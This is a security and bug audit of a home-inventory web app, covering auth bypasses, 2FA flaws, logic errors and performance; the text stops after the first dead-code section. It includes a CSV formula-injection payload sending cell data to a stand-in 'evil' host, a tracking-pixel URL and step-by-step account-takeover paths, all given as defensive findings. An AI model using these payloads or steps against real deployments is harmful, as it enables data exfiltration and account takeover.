# Bugs & Code Quality Analysis — home-registry

**Scope:** logic errors, security vulnerabilities, performance, dead or redundant code, and error handling. Architecture and structure are covered separately in [ANALYSIS_ARCH.md](ANALYSIS_ARCH.md). Where a finding here has a structural root cause described there, the ARCH ID is cross-referenced rather than re-explained.
**Baseline:** `main` @ `89e1e94` (2026-10-13). Line numbers refer to that commit.

**Priority key**
- **High**: exploitable now, loses or corrupts data, or breaks a core flow for many users.
- **Medium**: wrong behaviour in realistic conditions, or a real risk that needs a precondition.
- **Low**: an edge case, a hygiene problem, or something with limited impact.

---

## Summary table

| ID | Priority | Category | Title |
|----|----------|----------|-------|
| SEC1 | High | Security | Unauthenticated read/write/delete of all inventories, items, and organizers |
| SEC2 | High | Security | Missing ownership checks on share update/delete, image delete, and item-images listing |
| SEC3 | High | Security | Login skips TOTP when the TOTP lookup errors (fails open) |
| SEC4 | High | Security | A stolen session token can take over the account via recovery-code regeneration |
| SEC5 | High | Security | Unauthenticated Argon2 work amplification (recovery-code endpoint does up to 10 hashes per request) |
| SEC6 | Medium | Security | TOTP codes can be replayed, and the attempt limit can be raced |
| SEC7 | Medium | Security | TOTP mode can be downgraded (2FA turned off) without re-authentication |
| SEC8 | Medium | Security | Password change or reset does not invalidate existing JWTs; `is_admin` is read from stale claims |
| SEC9 | Medium | Security | CSV export is open to formula injection |
| SEC10 | Medium | Security | Account enumeration via deactivated-account response and login timing |
| SEC11 | Medium | Security | Internal error details returned to clients |
| SEC12 | Medium | Security | Open self-registration with no off switch |
| SEC13 | Medium | Security | JWT in `localStorage`, with a CSP that allows `unsafe-inline` and `unsafe-eval` scripts |
| SEC14 | Low | Security | First-run setup race, and rate limiter can panic or become ineffective |
| SEC15 | Low | Security | Backups store all password hashes and recovery-code hashes in plaintext JSON on disk |
| BUG1 | High | Logic | Every date is shown one day early for users west of UTC |
| BUG2 | High | Logic | Restoring a backup silently deletes every user's 2FA enrolment |
| BUG3 | High | Logic | Items created without `inventory_id` go into inventory #1, which may belong to another user |
| BUG4 | Medium | Logic | Wrong password when disabling 2FA logs the user out |
| BUG5 | Medium | Logic | Validator limits exceed DB column sizes, so valid-looking input returns 500 |
| BUG6 | Medium | Logic | Invalid dates are silently stored as NULL |
| BUG7 | Medium | Logic | Edit form cannot clear price or organizer values |
| BUG8 | Medium | Logic | Removing an image deletes the file before the edit is saved |
| BUG9 | Medium | Logic | Report statistics ignore the filters applied to the item list |
| BUG10 | Medium | Logic | Recovery codes can be double-spent, and a failed generation can lock the user out |
| BUG11 | Medium | Logic | Notifications page is empty on direct load or refresh |
| BUG12 | Medium | Logic | Backend restart or transient error logs everyone out |
| BUG13 | Medium | Logic | After logout, the next user sees the previous user's cached inventories and items |
| BUG14 | Medium | Logic | Backup export is not a consistent snapshot, and the restore error path cannot work as written |
| BUG15 | Medium | Logic | Organizer values are not validated against the item's inventory or the option's type |
| BUG16 | Medium | Logic | Unknown `currency` setting crashes every page that shows a price |
| BUG17 | Low | Logic | Smaller logic defects (list) |
| PERF1 | Medium | Performance | Inventory list ships every cover image as base64 and runs `DISTINCT` over it |
| PERF2 | Medium | Performance | N+1 requests and queries (inventories page, organizers) |
| PERF3 | Low | Performance | Smaller performance issues (list) |
| DEAD1 | Low | Dead code | Unused backend code |
| DEAD2 | Low | Dead code | Unused frontend code |
| DEAD3 | Low | Redundant | Redundant or no-op code |
| ERR1 | Medium | Error handling | Security-relevant writes whose failures are discarded with `let _ =` |
| ERR2 | Medium | Error handling | Multi-step operations report success after a partial failure |
| ERR3 | Medium | Error handling | DB errors are classified by string matching or collapsed to 500 |
| ERR4 | Low | Error handling | Frontend error handling gaps (list) |

---

## 1. Security vulnerabilities and unsafe patterns

### SEC1 — Unauthenticated read/write/delete of all inventories, items, and organizers · **High**
**Files:** `src/api/mod.rs:140-500` (inventory/item handlers), `src/api/mod.rs:504-950` (organizer handlers), `src/db/mod.rs:126-160` (`get_all_items`), `src/db/mod.rs:391-437` (`search_items`)
**Root cause:** ARCH A1.

None of these handlers call `get_auth_context_from_request`. Concretely, anyone who can reach the server, **with no token**, can do the following:
- `GET /api/items` returns every item of every user (`get_all_items` has no `WHERE`).
- `GET /api/items/search/{q}` searches all users' items.
- `GET /api/inventories/{id}` and `/items` enumerate any inventory by sequential integer ID.
- `PUT` or `DELETE /api/inventories/{id}` overwrite or delete any inventory. The delete cascades to its items, organizers, and shares.
- `POST /api/items` with an arbitrary `inventory_id` plants items in someone else's inventory.
- `PUT /api/items/{id}` with `inventory_id` moves another user's item into your own inventory, so you can steal it.
- `PUT /api/organizers/{id}`, `DELETE /api/organizer-options/{id}`, and similar routes do the same for organizers.

Because IDs are sequential `SERIAL` integers, a full dump takes one loop. Note that the frontend already sends the bearer token on these calls, so adding the check will not break the UI.

### SEC2 — Missing ownership checks on share update/delete, image delete, and item-images listing · **High**
**Files:** `src/api/auth.rs:1345-1391` (`update_inventory_share`), `src/api/auth.rs:1394-1432` (`delete_inventory_share`), `src/api/mod.rs:1115-1169` (`delete_image`), `src/api/mod.rs:1171-1215` (`get_inventory_item_images`)

These handlers authenticate the caller but never check that the caller has rights over the resource:
- **`update_inventory_share`** binds the context to `_auth` and calls `update_inventory_share(share_id, level)` directly. Any logged-in user who holds a `view` share can raise **their own share** to `edit_inventory`, because their own share ID is returned by `GET /auth/inventories` and the sharing UI.
- **`delete_inventory_share`** deletes any share by UUID. A recipient can remove other recipients.
- **`delete_image`** deletes any file in `uploads/img` that matches the filename pattern. Filenames appear in every item URL visible to sharees.
- **`get_inventory_item_images`** returns image URLs for any inventory ID.

### SEC3 — Login skips TOTP when the TOTP lookup errors (fails open) · **High**
**File:** `src/api/auth.rs:321-357`

```rust
let totp_settings = db_service.get_totp_settings(user.id).await.ok().flatten();
```
A DB error (pool exhaustion, a timeout, or a decrypt-unrelated query failure) becomes `None`, and the code falls through to `generate_token` (`:359`), issuing a **full** token to a 2FA-protected account with only a password. An unknown `totp_mode` string (`:325-327`, `if let Ok(mode)`) also falls through to a full login. An attacker who has a password can deliberately cause pool exhaustion (see SEC5) to make the lookup fail. **Fix:** treat `Err` and parse failures as "deny" (500 or 401), never as "no TOTP".

### SEC4 — A stolen session token can take over the account via recovery-code regeneration · **High**
**Files:** `src/api/auth.rs:1923-1994` (`generate_recovery_codes`), `src/api/auth.rs:2105-2252` (`use_recovery_code`)

`POST /auth/recovery-codes/generate` requires only a valid JWT, with no password and no TOTP, and returns 10 plaintext codes. `POST /auth/recovery-codes/use` then sets a new password with one of them. Anyone holding a token (XSS against `localStorage`, a shared device, or a leaked log) can therefore:
1. regenerate codes, which **invalidates the owner's saved codes** (`store_recovery_codes` deletes them, `db/mod.rs:2229-2233`);
2. reset the password;
3. lock the owner out permanently.

By contrast, `change_password` (`auth.rs:629-647`) and `totp_disable` (`totp.rs:597-620`) require the current password. Regeneration should require it too.

### SEC5 — Unauthenticated Argon2 work amplification · **High**
**Files:** `src/api/auth.rs:2174-2185`, `src/auth/mod.rs:243-268`, `src/main.rs:157-165`

`use_recovery_code` is public. For any **existing** username that has codes, each request runs up to **10 sequential Argon2id verifications** (`Argon2::default()` uses 19 MiB of memory and 2 iterations each), all on `spawn_blocking` (default pool: 512 threads). With the misconfigured rate limiter (ARCH A4: ~5,000 req/s per IP, and per worker), a single client can occupy the blocking pool and allocate gigabytes. That starves login, registration, and password changes for everyone, and starves the TOTP fail-open path in SEC3. Login and registration are also unauthenticated Argon2 endpoints, with one hash each. **Fix:** add per-account and per-IP attempt limits on unauthenticated hashing endpoints, and store an indexed lookup prefix (or a single code hash) instead of looping verify over 10 hashes.

### SEC6 — TOTP codes can be replayed, and the attempt limit can be raced · **Medium**
**Files:** `src/auth/totp.rs:208-233`, `src/api/totp.rs:25-48, 310-339, 440-466`, `src/db/mod.rs:3048-3085`

- **Replay:** `verify_totp_code` calls `totp.check(code, now)` with ±1 step of skew and never records which time step was consumed. `last_used_at` is written (`totp.rs:348`) but not compared. A code observed by shoulder-surfing, phishing, or logging can be reused for ~60–90 s, both for login (`/auth/totp/verify`) and for **password reset** (`/auth/totp/recover`).
- **Race:** the limit is check-then-increment. `is_totp_rate_limited` reads `failed_attempts` from a row fetched earlier, and the increment happens later in a separate statement. N parallel requests all pass the check before any increment lands, so the "5 per 15 minutes" limit becomes "as many as you can send concurrently per window". **Fix:** use an atomic `UPDATE ... SET failed_attempts = failed_attempts + 1 WHERE ... AND (failed_attempts < 5 OR last_failed_at < now() - interval) RETURNING ...` before verifying, and store the last accepted time step.
- `totp_setup` (`totp.rs:84-92` → `db/mod.rs:2905-2913`) resets `failed_attempts = 0` on every call while setup is pending, so the setup-verification limit is bypassed by calling setup again. The impact is limited to the user's own account.

### SEC7 — TOTP mode can be downgraded without re-authentication · **Medium**
**File:** `src/api/totp.rs:524-580`

`PUT /auth/totp/mode` needs only a JWT. Switching from `2fa_only` to `recovery_only` turns off the login second factor, and switching to `both` or `recovery_only` **enables password reset with only a TOTP code** (`totp_recover`, `:380-520`, which requires no password). Disabling TOTP requires the password (`totp_disable`), but this equivalent downgrade does not. It should require the password or a current TOTP code.

### SEC8 — Password change or reset does not invalidate existing JWTs; `is_admin` read from stale claims · **Medium**
**Files:** `src/auth/mod.rs:143-175, 210-217`, `src/api/auth.rs:589-689, 2196-2209`, `src/api/totp.rs:487-498`
**Root cause:** ARCH A5.

Tokens have no version or `iat`-vs-`password_changed_at` check. After `change_password`, `use_recovery_code`, `totp_recover`, or an admin password reset, every previously issued token stays valid for up to `JWT_TOKEN_LIFETIME_HOURS` (default 24 h). Recovering a compromised account therefore does not evict the attacker. Similarly, `AuthContext.is_admin` comes from the token, so a demoted admin keeps admin endpoints, including **backup download (all password hashes)** and **user deletion**, until the token expires.

### SEC9 — CSV export is open to formula injection · **Medium**
**File:** `src/api/mod.rs:1231-1289`

Item `name`, `description`, `category`, `location`, and `notes` are written raw. A value starting with `=`, `+`, `-`, `@`, tab, or CR (for example `=HYPERLINK("http://evil/?"&A1,"x")`) runs as a formula when the CSV is opened in Excel or LibreOffice. Shared inventories make this cross-user: a sharee with `edit_items` plants the payload, and the owner exports. **Fix:** prefix such cells with `'`.

### SEC10 — Account enumeration via deactivated-account response and login timing · **Medium**
**File:** `src/api/auth.rs:266-318`

- The deactivated check (`:288-296`) runs **before** password verification and returns a distinct 403 "Account deactivated". Any username can be probed for "exists and deactivated" without knowing the password.
- For a non-existent user, the code returns immediately (`:269-276`). For an existing user, it runs Argon2 (~tens of ms). The timing difference reveals valid usernames despite the "Don't reveal whether username exists" comment. `use_recovery_code` (`:2125-2170`) and `totp_recover` (`totp.rs:395-430`) have the same timing gap.
- `create_inventory_share` and `create_access_grant` (`auth.rs:1269-1276, 1572-1579`) confirm "No user found with username …" to any authenticated user, which is a deliberate but unrate-limited enumeration oracle.

**Fix:** verify against a dummy hash when the user is missing, and check `is_active` after the password.

### SEC11 — Internal error details returned to clients · **Medium**
**Files:** `src/api/auth.rs:48, 221, 914, 1010, 1043, 1128, 1911`, `src/api/mod.rs:1036, 1401, 1419, 1455, 1471, 1486, 1567, 1630`, `src/api/totp.rs:262`, `src/main.rs:197-204`

`format!("...: {e}")` and `Some(e.to_string())` send raw `tokio_postgres` / `Box<dyn Error>` text to the client, including SQL constraint names, column names, and query fragments (for example `value too long for type character varying(100)`, or `duplicate key value violates unique constraint "users_username_key"`). `main.rs`'s JSON error handler would echo the path and serde error, but it is dead code (ARCH P1). Two-thirds of the handlers already use a generic message, so this is inconsistency rather than policy.

### SEC12 — Open self-registration with no off switch · **Medium**
**File:** `src/api/auth.rs:385-511`

Once setup is done, `POST /auth/register` lets anyone create an active account. There is no `ALLOW_REGISTRATION` setting, no invite, and no admin approval. Combined with SEC1/SEC2, an internet-exposed instance gives strangers an authenticated foothold. Even with SEC1 fixed, this allows username enumeration (SEC10) and storage abuse (`settings_json`, image uploads at 5 MB each with no quota, `api/mod.rs:1016-1113`).

### SEC13 — JWT in `localStorage`, with a CSP that allows `unsafe-inline` and `unsafe-eval` scripts · **Medium**
**Files:** `frontend/src/services/api.ts:64-84`, `frontend/src/context/AuthContext.tsx:128, 163`, `src/main.rs:218-225`

The bearer token lives in `localStorage`, so any script injection is token theft, which leads straight to SEC4. The CSP that would normally contain injection allows `'unsafe-inline' 'unsafe-eval'` plus two third-party script CDNs, so it offers essentially no script protection. The React code does not use `dangerouslySetInnerHTML` (verified), so there is no known injection point today. The risk is that one future slip becomes a full account takeover. `X-XSS-Protection: 1; mode=block` (`main.rs:213`) is deprecated and ignored by current browsers.

### SEC14 — First-run setup race, and rate limiter can panic or become ineffective · **Low**
- **Setup race:** `initial_setup` (`src/api/auth.rs:156-173`) checks `user_count == 0` and then inserts, without a transaction or lock. Two concurrent requests can both create admins. More practically, `/auth/setup` is public, so on a freshly started, network-reachable instance whoever calls it first becomes admin. The docs should say to complete setup before exposing the port.
- **Rate limiter:** `src/main.rs:162` computes `Duration::from_millis(1000 / rps)`. `RATE_LIMIT_RPS=0` panics with divide-by-zero inside every worker factory, and `RATE_LIMIT_RPS>1000` produces a zero-length window, which disables limiting. See ARCH A4 for the wider misconfiguration.
- `JWT_TOKEN_LIFETIME_HOURS` set to a huge value makes `chrono::Duration::hours` panic on every login (`src/auth/mod.rs:152`). It is not bounds-checked.
- A `JWT_SECRET` shorter than 32 characters is **silently replaced** by a random one (`src/auth/mod.rs:37-46`, a warning only). In a multi-replica deployment or after a volume wipe, every token becomes invalid with no clear cause.

### SEC15 — Backups store all password hashes and recovery-code hashes in plaintext JSON on disk · **Low**
**Files:** `src/db/mod.rs:2694-2790`, `src/api/backup.rs:76-124`

`export_all_data` uses `to_jsonb(t)` on `users`, `recovery_codes`, and `password_reset_tokens`, and writes the result unencrypted to `backups/`. Backups are admin-only to download, but they sit on a volume that is commonly synced or offsite-copied (`docs/examples/backup.sh`). Argon2 makes offline cracking expensive, not impossible. Consider excluding auth tables or encrypting backups.

---

## 2. Logic errors and unhandled edge cases

### BUG1 — Every date is shown one day early for users west of UTC · **High**
**Files:** `frontend/src/utils/dateFormat.ts:22-48`, `frontend/src/utils/notifications.ts:30-31, 48-52`

The API returns date-only strings (`purchase_date::text` → `"2024-03-15"`). `new Date("2024-03-15")` is parsed as **UTC midnight**, and `getDate()` / `getMonth()` / `setHours(0,0,0,0)` then work in **local** time. In any UTC− timezone (all of the Americas), every purchase date and warranty date is displayed as the previous day (`03/14/2024`), and warranty "days until expiry" is off by one, so an item can show "expires in 0 days" a day early or flip between expired and expiring at the wrong time. **Fix:** parse `YYYY-MM-DD` manually (`new Date(y, m-1, d)`).

### BUG2 — Restoring a backup silently deletes every user's 2FA enrolment · **High**
**Files:** `src/db/mod.rs:2805-2826, 2830-2847`, `migrations/V023__create_totp_settings_table.sql:6`
**Root cause:** ARCH A3.

`import_all_data` runs `TRUNCATE users ... CASCADE`, which cascades to `user_totp_settings`. That table is in neither the export nor the import list, so after **any** restore, including the automatic "pre-restore" safety backup being restored, all users have 2FA disabled with no notice.

### BUG3 — Items created without `inventory_id` go into inventory #1 · **High**
**Files:** `src/db/mod.rs:225`, `src/models/mod.rs:60`

`request.inventory_id.unwrap_or(1)`, combined with `CreateItemRequest.inventory_id: Option<i32>`, means a create request that omits the field (any API client, or a frontend regression) silently inserts the item into **inventory 1**, which belongs to whichever user created the first inventory. Combined with SEC1, nobody is told. If inventory 1 has been deleted, it becomes a FK violation and a 500. `inventory_id` should be required.

### BUG4 — Wrong password when disabling 2FA logs the user out · **Medium**
**Files:** `src/api/totp.rs:618-623` (returns **401** for "Invalid password"), `frontend/src/services/api.ts:87-98`

`handleResponse` treats **every** 401 as "session expired": it clears `localStorage` and hard-redirects to `/login`. Because `totp_disable` uses 401 for a business-rule failure, a user who mistypes their password in Settings → Authenticator is logged out mid-flow. The same applies to any future handler that returns 401 for a domain error. Use 400 or 403 for wrong-password confirmations, and limit the client's global 401 handling to `get_auth_context` failures.

### BUG5 — Validator limits exceed DB column sizes, so valid-looking input returns 500 · **Medium**
**Files:** `src/models/mod.rs:64-67, 92-95` vs `migrations/V001__create_items_table.sql:6-7`; `src/models/mod.rs:40-41` vs `migrations/V002:6`; `src/models/mod.rs:326-366` (no validation) vs `migrations/V010:9, 22`; `src/models/mod.rs:769-778` vs `migrations/V015:4-8`; `src/models/mod.rs:457-490` vs `migrations/V013:5`

| Field | Validator allows | Column | Result |
|---|---|---|---|
| `items.category` | 255 | `VARCHAR(100)` | 101–255 chars → 500 |
| `items.location` | 500 | `VARCHAR(100)` | 101–500 chars → 500 |
| `inventories.location` | 500 | `VARCHAR(255)` | 256–500 → 500 |
| `organizer_types.name` | none | `VARCHAR(100)` | >100 → 500 |
| `organizer_options.name` | none | `VARCHAR(255)` | >255 → 500 |
| `users.full_name` | none | `VARCHAR(255)` | >255 → 500 |
| `user_settings.theme` / `date_format` / `currency` | none | `VARCHAR(20/20/10)` | → 500 |
| `organizer_types.input_type` | none | `CHECK IN (...)` | typo → 500 |

Each of these returns "An internal error occurred" (or leaks the PG message, see SEC11) for what is really a 400.

### BUG6 — Invalid dates are silently stored as NULL · **Medium**
**File:** `src/db/mod.rs:206-214, 312-335`

`NaiveDate::parse_from_str(s, "%Y-%m-%d").ok()` turns any malformed date into `None`. On **update**, the field is still added to `SET`, so an invalid `purchase_date` such as `"03/15/2024"` (a plausible API-client or locale input) **erases** the existing date and reports success. Return 400 instead.

### BUG7 — Edit form cannot clear price or organizer values · **Medium**
**Files:** `frontend/src/pages/InventoryDetailPage.tsx:1166-1170, 312-325`, `src/db/mod.rs:291-295`

- Clearing the price input sets `purchase_price: undefined`, which `JSON.stringify` omits. The backend treats an absent field as "unchanged", so **the old price stays**.
- Organizer values with no option or text are skipped when building `valuesToSave` (`:316-322`), and no delete call is made. Clearing a select or text organizer in the edit modal has no effect after saving. The `DELETE /items/{id}/organizer-values/{type}` endpoint exists but is never called by the edit flow.

### BUG8 — Removing an image deletes the file before the edit is saved · **Medium**
**Files:** `frontend/src/components/ImageOrganizerInput.tsx:67-79`, `frontend/src/pages/InventoryDetailPage.tsx:312-325`

`handleRemove` fires `imageApi.delete(filename)` immediately. If the user then clicks **Cancel**, the item still references the now-deleted file, so the image is permanently broken. Because of BUG7, even **saving** after removal does not clear the reference, so removal always leaves a dangling URL. Conversely, uploading in the add or edit modal and then cancelling leaves an orphaned file. Deleting an item or inventory never deletes its files either (`src/db/mod.rs:377-389, 570-585`).

### BUG9 — Report statistics ignore the filters applied to the item list · **Medium**
**Files:** `src/api/mod.rs:1460-1480`, `src/db/mod.rs:2525-2600, 2603-2690`

`get_inventory_report` filters `items` by category, location, dates, and price (`db/mod.rs:2420-2463`), but `get_inventory_statistics` and `get_category_breakdown` take only `inventory_id`. A report filtered to "Electronics, 2023" shows the filtered item list next to totals, counts, and percentages for **everything**. There are also two smaller inconsistencies:
- `SUM(purchase_price * quantity)` drops items whose `quantity` is NULL. NULL is possible because `create_item` inserts an explicit `$10` NULL, overriding `DEFAULT 1`. The frontend total (`InventoryDetailPage.tsx:365-368`) treats NULL as 1, so the two totals disagree.
- `COALESCE(category, 'Uncategorized')` does not cover `''`, so empty-string and NULL categories appear as two separate rows.

### BUG10 — Recovery codes can be double-spent, and a failed generation can lock the user out · **Medium**
**Files:** `src/api/auth.rs:2174-2226`, `src/db/mod.rs:2221-2255, 2293-2309`

- **Double use:** the code is matched, then the password is updated, then the code is marked used with `UPDATE ... WHERE id = $1`, with no `AND is_used = false` and no transaction. Two concurrent requests with the same code both succeed. If `mark_recovery_code_used` fails, the error is logged and ignored (`:2223-2226`), so the "one-time" code **remains reusable**.
- **Non-atomic regeneration:** `store_recovery_codes` deletes the old codes, then inserts 10 rows, then updates `users`, each as a separate auto-commit statement. A failure after the delete leaves the user with zero or partial codes, while the frontend may already have shown the full set as saved. The log line hardcodes `10` (`:2252`).
- Generated codes come from `Alphanumeric` (62 symbols) and are then upper-cased, so letters are twice as likely as digits. Entropy is still about 61 bits, which is adequate, but the distribution is not uniform.

### BUG11 — Notifications page is empty on direct load or refresh · **Medium**
**Files:** `frontend/src/pages/NotificationsPage.tsx:18-27`, `frontend/src/context/AppContext.tsx:39, 80-91`
**Root cause:** ARCH A11.

`warrantyNotifications` is derived from `AppContext.items`, which only `InventoriesPage` and `InventoryDetailPage` populate. Opening `/notifications` directly, refreshing it, or using a bookmark shows "no notifications". The "loading" state is a fake 100 ms `setTimeout` that never waits for data. After visiting one inventory, the page shows only **that** inventory's warranties. The sidebar badge has the same problem.

### BUG12 — Backend restart or transient error logs everyone out · **Medium**
**File:** `frontend/src/context/AuthContext.tsx:53-91`

On startup, `initAuth` calls `getProfile`. **Any** non-success result, including 500, 502 from a proxy during a container restart, 503, or an HTML error page parsed as `success: false`, as well as any thrown error (offline), calls `logout()`. Only a 401 should clear the session. Users with the PWA installed are logged out every time they open it offline or during an upgrade.

### BUG13 — After logout, the next user sees the previous user's cached data · **Medium**
**Files:** `frontend/src/context/AuthContext.tsx:193-202`, `frontend/src/context/AppContext.tsx:38-40`, `frontend/vite.config.ts:70-82`

`logout()` clears auth state but not `AppContext.inventories`, `items`, or `warrantyNotifications`, which live in a different provider. On a shared device, the next user who logs in **without a page reload** sees the previous user's inventories and warranty badges until each page refetches. The service worker's `api-cache` (ARCH A12) is also never cleared and serves the previous user's responses whenever the network request fails.

### BUG14 — Backup export is not a consistent snapshot, and the restore error path cannot work · **Medium**
**File:** `src/db/mod.rs:2694-2790, 2792-2894`

- Export runs 16 separate `SELECT`s outside a transaction. Concurrent writes between them produce a backup where, for example, `items` references an inventory created after `inventories` was read. The restore of that backup then fails on the FK. Wrapping the export in `BEGIN ISOLATION LEVEL REPEATABLE READ` fixes it.
- `SET CONSTRAINTS ALL DEFERRED` (`:2801`) is a no-op: none of the FKs are declared `DEFERRABLE`, so insertion order is the only thing preventing violations.
- The sequence-reset loop "ignores" errors (`:2879-2885`), but in PostgreSQL the first error aborts the transaction, and `commit()` then fails with "current transaction is aborted". The error is reported as a generic restore failure after all data has been truncated in the (rolled-back) transaction.
- `generate_backup_filename` uses second resolution (`backup.rs:65-68`). Two backups in the same second share a name, and `create_backup_file` overwrites without checking.
- The upload de-duplication loop (`backup.rs:386-402`) falls through after 100 collisions and **overwrites** the original.

### BUG15 — Organizer values are not validated against the item's inventory or the option's type · **Medium**
**File:** `src/db/mod.rs:1063-1097`

`set_item_organizer_value` upserts whatever `organizer_type_id` and `organizer_option_id` the client sends. Nothing checks that the type belongs to the item's inventory, that the option belongs to that type, or that `input_type` matches (an option ID for `text`, free text for `select`). Sending both `option_id` and `text_value` violates `check_value_type` and returns 500. An `image` organizer accepts any string as a URL, so `text_value: "https://tracker.example/pixel.gif"` is stored and rendered as an `<img>` for every sharee (the CSP allows `img-src https:`). `set_item_organizer_values` (`:1099-1110`) loops without a transaction, so a mid-list failure leaves some values saved and some not.

### BUG16 — Unknown `currency` setting crashes every page that shows a price · **Medium**
**Files:** `frontend/src/utils/currencyFormat.ts:37-38`, `frontend/src/pages/InventoryDetailPage.tsx:461, 562, 575, 890, 905`, `src/models/mod.rs:769-778`

`CURRENCY_CONFIGS[currency]` is `undefined` for any value outside the six hardcoded codes, and `config.decimals` then throws during render, which blanks the page (there is no error boundary). The backend accepts any string up to 10 characters for `currency` (BUG5), and the frontend casts with `as CurrencyType` without checking. One `PUT /auth/settings {"currency":"CHF"}` makes inventory pages unusable for that user. `date_format` falls back safely; `currency` does not.

### BUG17 — Smaller logic defects · **Low**
- **Search breaks on `/`:** `GET /items/search/{query}` uses a path segment, so a query containing `/` (encoded as `%2F`) does not match the route and returns 404 (`src/api/mod.rs:466`, `frontend/src/services/api.ts:356`). Search also ignores organizer values, so it searches legacy `category`/`location` (ARCH H2).
- **Quantity cannot be 0:** `parseInt(v) || 1` (`InventoryDetailPage.tsx:781, 1187`), even though the backend allows 0.
- **Stale closure in AboutDialog:** after `await onCheckForUpdates()`, the comparison reads the `latestVersion` prop captured at click time (`frontend/src/components/AboutDialog.tsx:74-80`), so the first manual check always reports "You're up to date!" even when an update was just found.
- **Version check cache is not tied to the current version:** a cached `updateAvailable: true` survives an upgrade until it expires (`hooks/useVersionCheck.ts:52-90, 166-174`), and the manual "Check for updates" button returns the cached value instead of re-querying. Pre-release comparison uses `localeCompare` (`utils/versionCompare.ts:98-101`), so `beta.10 < beta.2`.
- **Stale form state across `await`:** `handleImageUpload` writes `setFormData({ ...formData, image_url })` after HEIC conversion and compression, which can take seconds (`InventoriesPage.tsx:257-263`). Anything typed into name or description during that time is overwritten.
- **Out-of-order responses:** `loadInventoryDetail` (`InventoryDetailPage.tsx:104-149`) has no abort or staleness check. Switching inventories quickly can render inventory A's items under inventory B's header.
- **`window.history.replaceState({}, …)`** (`InventoryDetailPage.tsx:165`) wipes React Router's `{usr, key, idx}` history state, which confuses back and forward navigation afterwards.
- **Toast IDs use `Date.now()`** (`AppContext.tsx:58`), so two toasts in the same millisecond share a key and are removed together. Toasts are also removed twice, once by `AppContext` (3000 ms) and once by `ToastItem` (2700 + 300 ms), and `ToastItem`'s inner timers are not cleared on unmount (`Toast.tsx:36-44`).
- **Dismissal mutates React state in place:** `dismissNotification` writes into the object returned by `getDismissedWarranties()`, which is `settings.settings_json.dismissedWarranties` (`AuthContext.tsx:261-268`). If the API call fails, the in-memory state is already modified. Dismissals are never pruned, so `settings_json` grows forever, and a concurrent update from another tab or device is lost (last write wins on the whole blob).
- **`settings_json` NULL panics the request:** the column is nullable (V015), but `row.get(8)` decodes into non-`Option` `serde_json::Value` (`src/db/mod.rs:1529, 1563, 1652`), which panics on NULL. The frontend also dereferences `settings?.settings_json.dismissedWarranties` without `?.` on `settings_json` (`AuthContext.tsx:257`).
- **`default_inventory_id`** accepts any inventory ID, including other users' (`src/db/mod.rs:1586-1596`). A nonexistent ID returns an FK violation as a 500.
- **Last-admin protection is racy:** two admins demoting or deleting each other concurrently both see `count = 2` (`src/api/auth.rs:966-978, 1095-1104`).
- **Admin password reset runs before the existence check:** `admin_update_user` resets the password first (`auth.rs:983-1016`), then may return 404 or 500 from `admin_update_user`. A failure in the second step leaves the password changed but the response reporting an error.
- **`print()` then `close()` immediately** (`frontend/src/utils/security.ts:37-40`) closes the window before printing in Firefox and Safari. It is currently unused (DEAD2).
- **`compressImage` always outputs JPEG** (`imageCompression.ts:41`), so transparent PNG and GIF covers get a black background.

---

## 3. Performance problems

### PERF1 — Inventory list ships every cover image as base64 and runs `DISTINCT` over it · **Medium**
**Files:** `src/db/mod.rs:1919-1961`, `frontend/src/pages/InventoriesPage.tsx:244-263`, `src/models/mod.rs:42-43`

Inventory covers are stored as data URIs of up to 10 MB each (ARCH S2), and `get_accessible_inventories` selects `image_url` for every inventory **with `SELECT DISTINCT`**. Postgres therefore sorts and hashes multi-megabyte text values to de-duplicate rows. That `DISTINCT` is only needed because of the `LEFT JOIN`s; `EXISTS` would avoid it. The full payload is returned on every Inventories page load, every Settings and Organizers page load (`SettingsPage.tsx:57`, `OrganizersPage.tsx:80`), and every CSV export (`api/mod.rs:1408`, just to get names). The service worker then caches up to 100 such responses. Ten inventories with phone photos means ~5–20 MB per page view.

### PERF2 — N+1 requests and queries · **Medium**
- **`InventoriesPage.loadInventories`** (`frontend/src/pages/InventoriesPage.tsx:56-60`) fires one `GET /inventories/{id}/items` per inventory, downloading every item of every inventory just to show counts and compute notifications. Each request also runs the per-request auth DB lookup. Twenty inventories means 21 requests and 21 auth queries on every visit to the home page. Return `item_count` from the inventories query instead.
- **`get_organizer_types_with_options_by_inventory`** (`src/db/mod.rs:668-694`) runs one query for types, then one per `select` type for options, each taking a fresh pool checkout. A single `LEFT JOIN` with `array_agg` replaces it.
- **`InventoryDetailPage`** loads the organizer list and then, sequentially, item images (`:129-139`). This is a waterfall that could run in parallel with the other three requests.

### PERF3 — Smaller performance issues · **Low**
- **Every authenticated request does an extra DB round-trip** (`src/api/auth.rs:72-100`), and handlers then run a second `DatabaseService::new` with its own pool checkout. That is two pool checkouts per request where one connection would do.
- **Search is a full table scan:** `LOWER(col) LIKE '%q%'` across four columns (`src/db/mod.rs:398-405`) cannot use the existing B-tree indexes. A `pg_trgm` GIN index would fix it.
- **`AppContext` and `AuthContext` value objects are rebuilt every render** (`AppContext.tsx:94-113`, `AuthContext.tsx:316-338`) without `useMemo`, so every consumer re-renders on any state change, such as each toast. The "CRITICAL FIX" comments and `exhaustive-deps` suppressions are working around this.
- **Report CSV loads all matching items into memory** and builds the whole CSV in a `Vec<u8>` (`src/api/mod.rs:1231-1289`). Backup create and restore read and serialize the entire database into memory (`backup.rs:76-110`, `:495`), and the multipart limit is 100 MB per field. With inline base64 images, backups grow quickly.
- **Version check** (`hooks/useVersionCheck.ts:205-208`) runs on every Sidebar mount and calls `/health` uncached each time.
- **Verbose `info!` logging** on every list or read (`src/db/mod.rs:157, 434` and the handler duplicates at `src/api/mod.rs:59, 147, 304`) doubles log volume. Search queries and usernames are logged at `info`, which also puts user content in logs.

---

## 4. Dead, redundant, or no-op code

### DEAD1 — Unused backend code · **Low**
- `api::index` (`src/api/mod.rs:29-36`) is never registered, and it reads `index.html` with blocking `std::fs` inside an async handler.
- `PermissionLevel::can_edit`, `can_delete`, and `can_manage_sharing` (`src/models/mod.rs:588-610`) are deprecated and `#[allow(dead_code)]`. `can_manage_sharing` always returns `false`, which is a trap if anyone calls it.
- `DatabaseService::clear_item_organizer_values` (`src/db/mod.rs:1136-1157`) is `#[allow(dead_code)]`.
- Model structs for removed features: `Category`, `CreateCategoryRequest`, `Tag`, `CreateTagRequest`, `CustomField`, `CustomFieldValue`, `ItemWithRelations`, `CustomFieldWithValue`, `RecoveryCode` (`src/models/mod.rs:215-312, 800-810`). See ARCH H1.
